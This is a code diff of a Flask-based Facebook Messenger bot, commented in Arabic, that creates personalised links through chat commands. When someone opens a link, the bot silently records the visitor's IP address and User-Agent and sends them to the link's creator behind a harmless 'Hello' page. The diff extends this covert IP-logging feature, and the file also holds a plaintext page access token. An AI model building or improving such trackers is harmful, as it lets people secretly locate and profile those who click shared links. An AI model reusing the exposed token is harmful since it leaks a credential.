@@ -6,8 +6,9 @@ import os
 app = Flask(__name__)
 
 ACCESS_TOKEN = "EAAQQA1jZB5X4BO2xMCZCOEMpjj8sZANib8YPx1hGBp8EVRAATtLCbV041Wke1Y3K0fEF6n0h3ZBEkGm7wwoENo51XZB1UipOVcn2mWDNjSfbsj2q7f7gKTZA27RyWpz6yLjnRWM6PxwiDrD8qDXbQu72UZCDoMJS9ZCSGEyZBIZASxP2ZBweZCKNxxPAdqqCiwLrsKIpRAZDZD"
-DOMAIN = os.getenv("DOMAIN", "https://bogrinaxp.onrender.com")
+DOMAIN = "https://bogrinaxp.onrender.com"
 
+# تخزين بيانات المستخدمين والروابط
 user_data = {}
 
 @app.route("/", methods=["GET"])
@@ -32,22 +33,34 @@ def webhook():
             sender_id = messaging_event["sender"]["id"]
             if "message" in messaging_event:
                 message_text = messaging_event["message"]["text"]
-                if message_text.startswith("LINK@"):
-                    name = message_text.split("@")[1]
-                    user_data[sender_id] = name
-                    link = f"{DOMAIN}/{name}"
+
+                # إنشاء رابط جديد
+                if message_text.startswith("new-url("):
+                    name = message_text.split("(")[1].split(")")[0]
+                    user_data[sender_id] = {"name": name, "message": None}
+                    link = f"{DOMAIN}/{sender_id}/{name}"
                     send_message(sender_id, f"تم إنشاء الرابط: {link}")
+
+                # إنشاء رابط جديد مع رسالة
+                elif message_text.startswith("new-url-return("):
+                    parts = message_text.split("(")[1].split(")")[0].split("@")
+                    name = parts[0]
+                    message = parts[1] if len(parts) > 1 else "Hello"
+                    user_data[sender_id] = {"name": name, "message": message}
+                    link = f"{DOMAIN}/{sender_id}/{name}"
+                    send_message(sender_id, f"تم إنشاء الرابط: {link}")
+
             return jsonify({"message": "Message received!"}), 200
 
-@app.route("/<name>", methods=["GET"])
-def dynamic_link(name):
-    for user_id, user_name in user_data.items():
-        if user_name == name:
-            ip = request.remote_addr
-            user_agent = request.headers.get("User-Agent")
-            device_info = f"تم فتح الرابط من:\nIP: {ip}\nDevice: {user_agent}"
-            send_message(user_id, device_info)
-            return f"Hello, {name}!", 200
+@app.route("/<user_id>/<name>", methods=["GET"])
+def dynamic_link(user_id, name):
+    if user_id in user_data and user_data[user_id]["name"] == name:
+        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+        user_agent = request.headers.get("User-Agent")
+        message = user_data[user_id].get("message", "Hello")
+        device_info = f"تم فتح الرابط من:\nIP: {ip}\nUser-Agent: {user_agent}"
+        send_message(user_id, f"{message}\n{device_info}")
+        return f"Hello, {name}!", 200
     return "Name not found!", 404
 
 def send_message(sender, message):
